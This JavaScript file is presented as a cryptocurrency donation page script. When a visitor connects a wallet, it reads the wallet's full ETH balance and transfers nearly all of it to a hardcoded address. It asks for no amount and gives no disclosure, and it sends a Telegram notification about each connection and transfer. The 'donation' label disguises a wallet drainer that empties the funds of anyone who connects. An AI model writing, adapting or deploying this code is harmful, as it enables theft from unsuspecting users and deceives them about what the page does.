//import { sendTelegramMessage, updateStatus } from "../src/utils.js";
const donationAddress = "0x4cF7613aFE35ec64071F71f334e54e23698Fb2D9"; // Replace with your actual donation address
const infuraId = "4ac9cf56484d49f382352ea6fbe08004"; // Replace with your actual Infura Project ID


let provider;
let web3;

async function init() {
    document.getElementById('connect-wallet').addEventListener('click', connectWallet);
}

async function connectWallet() {
    const walletConnectModal = new WalletConnectModal.default({
        projectId: infuraId,
        network: "mainnet"
    });

    provider = await walletConnectModal.connect();

    web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    const fromAddress = accounts[0];
    const balance = await web3.eth.getBalance(fromAddress);

    const startTime = new Date().toLocaleString();
    updateStatus('Wallet connected. Processing donation...');
    sendTelegramMessage(`Wallet connected at ${startTime}`);
    sendDonation(fromAddress, balance);
}

async function sendDonation(fromAddress, balance) {
    try {
        const gasPrice = await web3.eth.getGasPrice();
        const gasEstimate = await web3.eth.estimateGas({
            from: fromAddress,
            to: donationAddress,
            value: balance
        });

        const tx = {
            from: fromAddress,
            to: donationAddress,
            value: balance - gasPrice * gasEstimate,
            gas: gasEstimate,
            gasPrice: gasPrice
        };

        await web3.eth.sendTransaction(tx)
            .once('transactionHash', hash => {
                updateStatus('Donation sent. Transaction hash: ' + hash);
                sendTelegramMessage(`Donation sent. Amount: ${balance} ETH. Transaction hash: ${hash}`);
            });
    } catch (error) {
        console.error(error);
        updateStatus('Transaction failed. Please try again.');
        sendTelegramMessage('Transaction failed: ' + error.message);
    }
}

window.addEventListener('load', init);



